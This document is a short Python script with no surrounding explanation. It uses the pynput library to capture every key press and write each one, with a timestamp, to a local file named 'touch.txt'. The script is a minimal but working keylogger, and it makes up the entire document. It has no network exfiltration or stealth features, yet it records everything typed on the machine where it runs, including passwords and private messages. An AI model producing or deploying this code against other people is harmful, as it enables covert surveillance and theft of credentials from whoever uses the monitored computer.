from pynput.keyboard import Listener
import logging

file = "touch.txt"
logging.basicConfig(filename=file, level=logging.DEBUG, format="%(asctime)s %(message)s")

def on_press(key):
    logging.info(key)

with Listener(on_press=on_press) as listener:
    listener.join()
